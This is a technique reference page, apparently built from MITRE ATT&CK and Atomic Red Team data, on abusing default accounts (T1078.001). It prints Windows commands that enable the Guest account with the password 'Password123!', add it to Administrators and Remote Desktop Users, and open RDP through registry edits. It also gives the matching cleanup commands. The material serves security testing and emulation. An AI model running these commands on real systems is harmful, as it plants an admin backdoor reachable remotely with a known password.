
# Default Accounts

## Description

### MITRE Description

> Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory/provider set accounts on other types of systems, software, or devices.(Citation: Microsoft Local Accounts Feb 2019)

Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'User']
* Platforms: ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure', 'Office 365', 'Azure AD', 'SaaS']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1078/001

## Potential Commands

```
net user guest /active:yes
net user guest Password123!
net localgroup administrators guest /add
net localgroup "Remote Desktop Users" guest /add
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
```

## Commands Dataset

```
[{'command': 'net user guest /active:yes\n'
             'net user guest Password123!\n'
             'net localgroup administrators guest /add\n'
             'net localgroup "Remote Desktop Users" guest /add\n'
             'reg add "hklm\\system\\CurrentControlSet\\Control\\Terminal '
             'Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n'
             'reg add "hklm\\system\\CurrentControlSet\\Control\\Terminal '
             'Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f',
  'name': None,
  'source': 'atomics/T1078.001/T1078.001.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Valid Accounts: Default Accounts': {'atomic_tests': [{'auto_generated_guid': '99747561-ed8d-47f2-9c91-1e5fde1ed6e0',
                                                                                'description': 'After '
                                                                                               'execution '
                                                                                               'the '
                                                                                               'Default '
                                                                                               'Guest '
                                                                                               'account '
                                                                                               'will '
                                                                                               'be '
                                                                                               'enabled '
                                                                                               '(Active) '
                                                                                               'and '
                                                                                               'added '
                                                                                               'to '
                                                                                               'Administrators '
                                                                                               'and '
                                                                                               'Remote '
                                                                                               'Desktop '
                                                                                               'Users '
                                                                                               'Group, '
                                                                                               'and '
                                                                                               'desktop '
                                                                                               'will '
                                                                                               'allow '
                                                                                               'multiple '
                                                                                               'RDP '
                                                                                               'connections',
                                                                                'executor': {'cleanup_command': 'net '
                                                                                                                'user '
                                                                                                                'guest '
                                                                                                                '/active:no\n'
                                                                                                                'net '
                                                                                                                'localgroup '
                                                                                                                'administrators '
                                                                                                                'guest '
                                                                                                                '/delete\n'
                                                                                                                'net '
                                                                                                                'localgroup '
                                                                                                                '"Remote '
                                                                                                                'Desktop '
                                                                                                                'Users" '
                                                                                                                'guest '
                                                                                                                '/delete\n'
                                                                                                                'reg '
                                                                                                                'delete '
                                                                                                                '"hklm\\system\\CurrentControlSet\\Control\\Terminal '
                                                                                                                'Server" '
                                                                                                                '/v '
                                                                                                                'fDenyTSConnections '
                                                                                                                '/f\n'
                                                                                                                'reg '
                                                                                                                'delete '
                                                                                                                '"hklm\\system\\CurrentControlSet\\Control\\Terminal '
                                                                                                                'Server" '
                                                                                                                '/v '
                                                                                                                '"AllowTSConnections" '
                                                                                                                '/f',
                                                                                             'command': 'net '
                                                                                                        'user '
                                                                                                        'guest '
                                                                                                        '/active:yes\n'
                                                                                                        'net '
                                                                                                        'user '
                                                                                                        'guest '
                                                                                                        'Password123!\n'
                                                                                                        'net '
                                                                                                        'localgroup '
                                                                                                        'administrators '
                                                                                                        'guest '
                                                                                                        '/add\n'
                                                                                                        'net '
                                                                                                        'localgroup '
                                                                                                        '"Remote '
                                                                                                        'Desktop '
                                                                                                        'Users" '
                                                                                                        'guest '
                                                                                                        '/add\n'
                                                                                                        'reg '
                                                                                                        'add '
                                                                                                        '"hklm\\system\\CurrentControlSet\\Control\\Terminal '
                                                                                                        'Server" '
                                                                                                        '/v '
                                                                                                        'fDenyTSConnections '
                                                                                                        '/t '
                                                                                                        'REG_DWORD '
                                                                                                        '/d '
                                                                                                        '0 '
                                                                                                        '/f\n'
                                                                                                        'reg '
                                                                                                        'add '
                                                                                                        '"hklm\\system\\CurrentControlSet\\Control\\Terminal '
                                                                                                        'Server" '
                                                                                                        '/v '
                                                                                                        '"AllowTSConnections" '
                                                                                                        '/t '
                                                                                                        'REG_DWORD '
                                                                                                        '/d '
                                                                                                        '0x1 '
                                                                                                        '/f',
                                                                                             'elevation_required': True,
                                                                                             'name': 'command_prompt'},
                                                                                'name': 'Enable '
                                                                                        'Guest '
                                                                                        'account '
                                                                                        'with '
                                                                                        'RDP '
                                                                                        'capability '
                                                                                        'and '
                                                                                        'admin '
                                                                                        'priviliges',
                                                                                'supported_platforms': ['windows']}],
                                                              'attack_technique': 'T1078.001',
                                                              'display_name': 'Valid '
                                                                              'Accounts: '
                                                                              'Default '
                                                                              'Accounts'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Initial Access](../tactics/Initial-Access.md)
    
* [Persistence](../tactics/Persistence.md)
    
* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations


* [Password Policies](../mitigations/Password-Policies.md)


# Actors

None
